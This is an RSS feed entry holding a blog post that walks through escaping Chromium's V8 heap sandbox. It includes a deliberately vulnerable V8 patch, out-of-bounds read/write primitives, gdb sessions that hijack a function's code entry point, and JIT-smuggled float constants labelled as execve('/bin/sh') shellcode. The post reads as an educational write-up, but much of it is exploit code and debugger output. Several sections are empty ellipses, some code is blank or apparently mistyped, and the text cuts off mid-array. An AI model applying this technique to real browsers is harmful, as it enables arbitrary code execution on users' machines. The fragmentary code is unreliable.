<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Javascript Engines on Anvbis</title><link>https://anvbis.github.io/categories/javascript-engines/</link><description>Recent content in Javascript Engines on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Sat, 27 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/categories/javascript-engines/index.xml" rel="self" type="application/rss+xml"/><item><title>Escaping Chromium's V8 Heap Sandbox</title><link>https://anvbis.github.io/posts/chrome-v8-escaping-chromiums-v8-heap-sandbox/</link><pubDate>Sat, 27 Nov 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/chrome-v8-escaping-chromiums-v8-heap-sandbox/</guid><description>1. Overview The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution (looking at you, wasm shellcode), new methods have risen to take their place.
I thought it would be worthwile to detail one such method in an article. I&amp;rsquo;ve seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained.</description><content>&lt;h2 id="1-overview">1. Overview&lt;/h2>
&lt;p>The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution (looking at you, wasm shellcode), new methods have risen to take their place.&lt;/p>
&lt;p>I thought it would be worthwile to detail one such method in an article. I&amp;rsquo;ve seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained. This is mostly for my own reference, but anyone is welcome to learn from it.&lt;/p>
&lt;h2 id="2-introducing-the-heap-sandbox">2. Introducing the Heap Sandbox&lt;/h2>
&lt;p>First introduced into V8 around a year ago (at the time of this post), the motivation behind the implementation of the heap sandbox was to limit an attacker&amp;rsquo;s ability to write data outside of V8&amp;rsquo;s heap address-space.&lt;/p>
&lt;p>It primarily performs this through the isolation of all external pointers and references to off-heap objects (e.g. the backing store of an ArrayBuffer object). In the heap sandbox, these pointers are converted to references to an external pointer table, essentially indices of a lookup table.&lt;/p>
&lt;p>Memory corruption outside of V8&amp;rsquo;s heap is considered to be an escape from this sandbox. That definition also covers arbitrary code execution.&lt;/p>
&lt;h3 id="21-exploring-the-sandbox">2.1. Exploring the Sandbox&lt;/h3>
&lt;p>So as previously mentioned, external pointers should be isolated and converted to references to elements of an external pointer table, we can explore what this looks like in practice.&lt;/p>
&lt;p>We can start by allocating two objects, &lt;code>a&lt;/code> and &lt;code>b&lt;/code>, printing debug information, and digging around the memory a little.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ArrayBuffer&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">a&lt;/span>);
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ArrayBuffer&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">b&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">SystemBreak&lt;/span>();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The debug information for these two objects shows that their backing stores are located at &lt;code>0x19fa00000000&lt;/code> and &lt;code>0x19fa00001000&lt;/code> respectively. Interesting that ArrayBuffer objects are effectively allocated an entire page, even if their size is significantly smaller than 4096 bytes.&lt;/p>
&lt;pre>&lt;code>DebugPrint: 0x19f90010ba95: [JSArrayBuffer]
- map: 0x19f90024b945 &amp;lt;Map[68](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x19f90024ba19 &amp;lt;Object map = 0x19f90024b96d&amp;gt;
- elements: 0x19f900002259 &amp;lt;FixedArray[0]&amp;gt; [HOLEY_ELEMENTS]
- embedder fields: 2
- backing_store: 0x19fa00000000
- byte_length: 1337
- max_byte_length: 1337
...
DebugPrint: 0x19f90010bad9: [JSArrayBuffer]
- map: 0x19f90024b945 &amp;lt;Map[68](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x19f90024ba19 &amp;lt;Object map = 0x19f90024b96d&amp;gt;
- elements: 0x19f900002259 &amp;lt;FixedArray[0]&amp;gt; [HOLEY_ELEMENTS]
- embedder fields: 2
- backing_store: 0x19fa00001000
- byte_length: 1337
- max_byte_length: 1337
...
&lt;/code>&lt;/pre>&lt;p>Viewing these objects in memory, they&amp;rsquo;re almost identical except for one value stored 0x24 bytes from the start of the object, &lt;code>0x01000000&lt;/code> and &lt;code>0x01000010&lt;/code>. It wouldn&amp;rsquo;t be too crazy to think these must be the lookup values for the backing store.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/12dwx 0x19f90010ba95-1
0x19f90010ba94: 0x0024b945 0x00002259 0x00002259 0x000023e1
0x19f90010baa4: 0x20000000 0x000000a7 0x20000000 0x000000a7
0x19f90010bab4: 0x00000000 0x01000000 0xe98c1ea0 0x000055fe
pwndbg&amp;gt; x/12dwx 0x19f90010bad9-1
0x19f90010bad8: 0x0024b945 0x00002259 0x00002259 0x000023e1
0x19f90010bae8: 0x20000000 0x000000a7 0x20000000 0x000000a7
0x19f90010baf8: 0x00000000 0x01000010 0xe98c1f50 0x000055fe
&lt;/code>&lt;/pre>&lt;p>This can easily be verified by setting the memory at that location for object &lt;code>a&lt;/code> to that of &lt;code>b&lt;/code>. Printing the debug information for object &lt;code>a&lt;/code>, it shows that the backing store has updated to that of object &lt;code>b&lt;/code>.&lt;/p>
&lt;p>This proves the initial hypothesis was correct. We&amp;rsquo;ve found the reference value used to perform a lookup on the external pointer table.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; set *(int32_t *)(0x19f90010ba94+0x24) = 0x01000010
pwndbg&amp;gt; job 0x19f90010ba95
DebugPrint: 0x19f90010ba95: [JSArrayBuffer]
- map: 0x19f90024b945 &amp;lt;Map[68](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x19f90024ba19 &amp;lt;Object map = 0x19f90024b96d&amp;gt;
- elements: 0x19f900002259 &amp;lt;FixedArray[0]&amp;gt; [HOLEY_ELEMENTS]
- embedder fields: 2
- backing_store: 0x19fa00001000
- byte_length: 1337
- max_byte_length: 1337
...
&lt;/code>&lt;/pre>&lt;p>I don&amp;rsquo;t want to dive too deep into the internals of the V8 heap sandbox in this article, so I won&amp;rsquo;t go any further for today. But it is good to know that you can replace an object&amp;rsquo;s index with that of another, potentially giving you write access somewhere else external to the heap.&lt;/p>
&lt;h2 id="3-escaping-the-heap-sandbox">3. Escaping the Heap Sandbox&lt;/h2>
&lt;p>Now we move on to actually performing a heap sandbox escape. I&amp;rsquo;ve included a patch for a very, very, very simple array out-of-bounds vulnerability below. I&amp;rsquo;ll be using that to demonstrate the technique.&lt;/p>
&lt;p>Note: If you want to follow along, the commit hash for the build of V8 I&amp;rsquo;m using is &lt;code>bd5b3ae5422e9fa1d0f7a281bbdf709e6db65f62&lt;/code>.&lt;/p>
&lt;h3 id="31-an-example-vulnerability">3.1. An Example Vulnerability&lt;/h3>
&lt;p>As mentioned above, the vulnerability introduced here is very simple. A new &lt;code>JSArray&lt;/code> builtin is added that allows you to change the length of any array to an arbitrary value, effectively providing you with out-of-bounds access below the array.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" checked />
&lt;label for="1">
&lt;span class="collapsable-code__language">diff&lt;/span>
&lt;span class="collapsable-code__title">patch.diff&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-diff" >&lt;code>
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 49fe48d698..2944eb9edb 100644
--- a/src/builtins/builtins-array.cc
&amp;#43;&amp;#43;&amp;#43; b/src/builtins/builtins-array.cc
@@ -395,6 &amp;#43;395,25 @@ BUILTIN(ArrayPush) {
return *isolate-&amp;gt;factory()-&amp;gt;NewNumberFromUint((new_length));
}
&amp;#43;BUILTIN(ArrayLen) {
&amp;#43; uint32_t len = args.length();
&amp;#43; if(len != 2) return ReadOnlyRoots(isolate).undefined_value();
&amp;#43;
&amp;#43; Handle&amp;lt;JSReceiver&amp;gt; receiver;
&amp;#43; ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
&amp;#43; isolate, receiver, Object::ToObject(isolate, args.receiver()));
&amp;#43; Handle&amp;lt;JSArray&amp;gt; array = Handle&amp;lt;JSArray&amp;gt;::cast(receiver);
&amp;#43;
&amp;#43; Handle&amp;lt;Object&amp;gt; argLen;
&amp;#43; ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
&amp;#43; isolate, argLen, Object::ToNumber(isolate, args.at&amp;lt;Object&amp;gt;(1)));
&amp;#43; uint32_t newLen = static_cast&amp;lt;uint32_t&amp;gt;(argLen-&amp;gt;Number());
&amp;#43;
&amp;#43; auto raw = *array;
&amp;#43; raw.set_length(Smi::FromInt(newLen));
&amp;#43; return ReadOnlyRoots(isolate).undefined_value();
&amp;#43;}
&amp;#43;
namespace {
V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 859b5cee9a..a16a7d5ca1 100644
--- a/src/builtins/builtins-definitions.h
&amp;#43;&amp;#43;&amp;#43; b/src/builtins/builtins-definitions.h
@@ -392,6 &amp;#43;392,7 @@ namespace internal {
CPP(ArrayPrototypeGroupToMap) \
/* ES6 #sec-array.prototype.push */ \
CPP(ArrayPush) \
&amp;#43; CPP(ArrayLen) \
TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel) \
/* ES6 #sec-array.prototype.shift */ \
CPP(ArrayShift) \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 5888a5cdab..5d13eac799 100644
--- a/src/compiler/typer.cc
&amp;#43;&amp;#43;&amp;#43; b/src/compiler/typer.cc
@@ -1880,6 &amp;#43;1880,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
return Type::Receiver();
case Builtin::kArrayPush:
return t-&amp;gt;cache_-&amp;gt;kPositiveSafeInteger;
&amp;#43; case Builtin::kArrayLen:
&amp;#43; return Type::Receiver();
case Builtin::kArrayPrototypeReverse:
case Builtin::kArrayPrototypeSlice:
return Type::Receiver();
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 7c7b917502..550b25d4ba 100644
--- a/src/init/bootstrapper.cc
&amp;#43;&amp;#43;&amp;#43; b/src/init/bootstrapper.cc
@@ -1808,6 &amp;#43;1808,8 @@ void Genesis::InitializeGlobal(Handle&amp;lt;JSGlobalObject&amp;gt; global_object,
0, false);
SimpleInstallFunction(isolate_, proto, &amp;#34;push&amp;#34;, Builtin::kArrayPrototypePush,
1, false);
&amp;#43; SimpleInstallFunction(isolate_, proto, &amp;#34;len&amp;#34;, Builtin::kArrayLen,
&amp;#43; 2, false);
SimpleInstallFunction(isolate_, proto, &amp;#34;reverse&amp;#34;,
Builtin::kArrayPrototypeReverse, 0, false);
SimpleInstallFunction(isolate_, proto, &amp;#34;shift&amp;#34;,
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Here&amp;rsquo;s some Javascript code that triggers this vulnerability. The &lt;code>len&lt;/code> builtin is called, and sets the length of the array to the value of &lt;code>1337&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>, &lt;span style="color:#ae81ff">2.2&lt;/span>];
&lt;span style="color:#a6e22e">a&lt;/span>.&lt;span style="color:#a6e22e">len&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">a&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can see in the debug information below, that while the array only has two elements, the length of the array is &lt;code>1337&lt;/code>, giving us unrestricted out-of-bounds access below it.&lt;/p>
&lt;pre>&lt;code>DebugPrint: 0x27ff0004b9c9: [JSArray]
- map: 0x27ff0018e6bd &amp;lt;Map[16](PACKED_DOUBLE_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x27ff0018e11d &amp;lt;JSArray[0]&amp;gt;
- elements: 0x27ff0004b9b1 &amp;lt;FixedDoubleArray[2]&amp;gt; [PACKED_DOUBLE_ELEMENTS]
- length: 1337
- properties: 0x27ff00002259 &amp;lt;FixedArray[0]&amp;gt;
- All own properties (excluding elements): {
0x27ff00006551: [String] in ReadOnlySpace: #length: 0x27ff00144269 &amp;lt;AccessorInfo name= 0x27ff00006551 &amp;lt;String[6]: #length&amp;gt;, data= 0x27ff000023e1 &amp;lt;undefined&amp;gt;&amp;gt; (const accessor descriptor), location: descriptor
}
- elements: 0x27ff0004b9b1 &amp;lt;FixedDoubleArray[2]&amp;gt; {
0: 1.1
1: 2.2
}
...
&lt;/code>&lt;/pre>&lt;h3 id="32-a-few-exploit-primitives">3.2. A Few Exploit Primitives&lt;/h3>
&lt;p>I&amp;rsquo;m not going to go into too much detail here, as there are a lot of resources detailing common V8 exploit primitives. Plus if you&amp;rsquo;re reading this I&amp;rsquo;m assuming you already know a little about V8 exploitation.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">ArrayBuffer&lt;/span>(&lt;span style="color:#ae81ff">8&lt;/span>);
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Float64Array&lt;/span>(&lt;span style="color:#a6e22e">bs&lt;/span>);
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">is&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">BigUint64Array&lt;/span>(&lt;span style="color:#a6e22e">bs&lt;/span>);
&lt;span style="color:#75715e">/* converts a float to a 64-bit uint */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>) {
&lt;span style="color:#a6e22e">fs&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>;
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">is&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>];
}
&lt;span style="color:#75715e">/* converts a 64-bit uint to a float */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>) {
&lt;span style="color:#a6e22e">is&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>;
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>];
}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* create an oob array */&lt;/span>
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">oob&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>];
&lt;span style="color:#a6e22e">oob&lt;/span>.&lt;span style="color:#a6e22e">len&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
&lt;span style="color:#75715e">/* flt.elements @ oob[] */&lt;/span>
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">flt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>[&lt;span style="color:#ae81ff">1.1&lt;/span>];
&lt;span style="color:#75715e">/* obj.elements @ oob[] */&lt;/span>
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>};
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>[&lt;span style="color:#a6e22e">tmp&lt;/span>];
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* addrof primitive */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">addrof&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>) {
}
&lt;span style="color:#75715e">/* 64-bit read primitive */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#a6e22e">p&lt;/span>) {
&lt;span style="color:#75715e">// ...
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]);
}
&lt;span style="color:#75715e">/* 64-bit write primitive */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>(&lt;span style="color:#a6e22e">p&lt;/span>, &lt;span style="color:#a6e22e">x&lt;/span>) {
&lt;span style="color:#75715e">// ...
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="33-redirecting-code-execution">3.3. Redirecting Code Execution&lt;/h3>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
&lt;span style="color:#66d9ef">return&lt;/span>;
}
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">SystemBreak&lt;/span>();
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>DebugPrint: 0x31df0004b9cd: [Function]
- map: 0x31df00184241 &amp;lt;Map[28](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x31df001840f5 &amp;lt;JSFunction (sfi = 0x31df00145df5)&amp;gt;
- elements: 0x31df00002259 &amp;lt;FixedArray[0]&amp;gt; [HOLEY_ELEMENTS]
- function prototype: &amp;lt;no-prototype-slot&amp;gt;
- shared_info: 0x31df00199f41 &amp;lt;SharedFunctionInfo foo&amp;gt;
- name: 0x31df00199ea5 &amp;lt;String[3]: #foo&amp;gt;
- builtin: CompileLazy
- formal_parameter_count: 0
- kind: ArrowFunction
- context: 0x31df0019a015 &amp;lt;ScriptContext[3]&amp;gt;
- code: 0x31df001467e5 &amp;lt;CodeDataContainer BUILTIN CompileLazy&amp;gt;
- source code: () =&amp;gt; {
return;
}
...
&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; job 0x31df001467e5
0x31df001467e5: [CodeDataContainer] in OldSpace
- map: 0x31df00002a71 &amp;lt;Map[28](CODE_DATA_CONTAINER_TYPE)&amp;gt;
- kind: BUILTIN
- builtin: CompileLazy
- is_off_heap_trampoline: 1
- code: 0
- code_entry_point: 0x55f3898c21c0
- kind_specific_flags: 0
pwndbg&amp;gt; x/4gx 0x31df001467e5-1
0x31df001467e4: 0x000023e100002a71 0x898c21c000000000
0x31df001467f4: 0x00590032000055f3 0x00002a7100000000
pwndbg&amp;gt; x/gx 0x31df001467e5-1+0xc
0x31df001467f0: 0x000055f3898c21c0
&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; set *(int64_t *)(0x31df001467e5-1+0xc) = 0x6161616161616161
pwndbg&amp;gt; job 0x31df001467e5
0x31df001467e5: [CodeDataContainer] in OldSpace
- map: 0x31df00002a71 &amp;lt;Map[28](CODE_DATA_CONTAINER_TYPE)&amp;gt;
- kind: BUILTIN
- builtin: CompileLazy
- is_off_heap_trampoline: 1
- code: 0
- code_entry_point: 0x6161616161616161
- kind_specific_flags: 0
pwndbg&amp;gt; c
...
â–º 0x55f3898b6c5f &amp;lt;Builtins_CallFunction_ReceiverIsAny+287&amp;gt; jmp rcx &amp;lt;0x6161616161616161&amp;gt;
&lt;/code>&lt;/pre>&lt;h3 id="34-writing-shellcode">3.4. Writing Shellcode&lt;/h3>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
&lt;span style="color:#66d9ef">return&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>, &lt;span style="color:#ae81ff">2.2&lt;/span>, &lt;span style="color:#ae81ff">3.3&lt;/span>, &lt;span style="color:#ae81ff">4.4&lt;/span>];
}
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">PrepareFunctionForOptimization&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">OptimizeFunctionOnNextCall&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">foo&lt;/span>();
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>DebugPrint: 0x301d0004ba31: [Function]
- map: 0x301d00184241 &amp;lt;Map[28](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x301d001840f5 &amp;lt;JSFunction (sfi = 0x301d00145df5)&amp;gt;
- elements: 0x301d00002259 &amp;lt;FixedArray[0]&amp;gt; [HOLEY_ELEMENTS]
- function prototype: &amp;lt;no-prototype-slot&amp;gt;
- shared_info: 0x301d00199f95 &amp;lt;SharedFunctionInfo foo&amp;gt;
- name: 0x301d00199ea5 &amp;lt;String[3]: #foo&amp;gt;
- formal_parameter_count: 0
- kind: ArrowFunction
- context: 0x301d0019a07d &amp;lt;ScriptContext[3]&amp;gt;
- code: 0x301d0019a1fd &amp;lt;CodeDataContainer TURBOFAN&amp;gt;
- source code: () =&amp;gt; {
return [1.1, 2.2, 3.3, 4.4];
}
...
&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; job 0x301d0019a1fd
0x301d0019a1fd: [CodeDataContainer] in OldSpace
- map: 0x301d00002a71 &amp;lt;Map[28](CODE_DATA_CONTAINER_TYPE)&amp;gt;
- kind: TURBOFAN
- is_off_heap_trampoline: 0
- code: 0x55cdc0004001 &amp;lt;Code TURBOFAN&amp;gt;
- code_entry_point: 0x55cdc0004040
- kind_specific_flags: 4
pwndbg&amp;gt; x/40i 0x55cdc0004040
...
0x55cdc00040a7: movabs r10,0x3ff199999999999a
0x55cdc00040b1: vmovq xmm0,r10
0x55cdc00040b6: vmovsd QWORD PTR [rcx+0x7],xmm0
0x55cdc00040bb: movabs r10,0x400199999999999a
0x55cdc00040c5: vmovq xmm0,r10
0x55cdc00040ca: vmovsd QWORD PTR [rcx+0xf],xmm0
0x55cdc00040cf: movabs r10,0x400a666666666666
0x55cdc00040d9: vmovq xmm0,r10
0x55cdc00040de: vmovsd QWORD PTR [rcx+0x17],xmm0
0x55cdc00040e3: movabs r10,0x401199999999999a
...
&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/gx 0x55cdc00040a7+2
0x55cdc00040a9: 0x3ff199999999999a
pwndbg&amp;gt; x/gx 0x55cdc00040bb+2
0x55cdc00040bd: 0x400199999999999a
pwndbg&amp;gt; p/x (0x55cdc00040bb+2)-(0x55cdc00040a7+2)
$3 = 0x14
&lt;/code>&lt;/pre>&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* execve(&amp;#34;/bin/sh&amp;#34;, 0, 0); */&lt;/span>
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
&lt;span style="color:#66d9ef">return&lt;/span> [
&lt;span style="color:#ae81ff">1.0&lt;/span>,
&lt;span style="color:#ae81ff">1.95538254221075331056310651818&lt;/span>&lt;span style="color:#a6e22e">E&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.95606125582421466942709801013&lt;/span>&lt;span style="color:#a6e22e">E&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.99957147195425773436923756715&lt;/span>&lt;span style="color:#a6e22e">E&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">1.95337673326740932133292175341&lt;/span>&lt;span style="color:#a6e22e">E&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
&lt;span style="color:#ae81ff">2.63486047652296056448306022844&lt;/span>&lt;span style="color:#a6e22e">E&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">284&lt;/span>
];
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="35-executing-shellcode">3.5. Executing Shellcode&lt;/h3>
&lt;p>&amp;hellip;&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* execve(&amp;#34;/bin/sh&amp;#34;, 0, 0); */&lt;/span>
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
&lt;span style="color:#66d9ef">return&lt;/span> [
&lt;span style="color:#ae81ff">1.0&lt;/span>,
&lt;span style="color:#ae81ff">1.95538254221075331056310651818&lt;/span>&lt;span style="color:#a6e22e">E&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
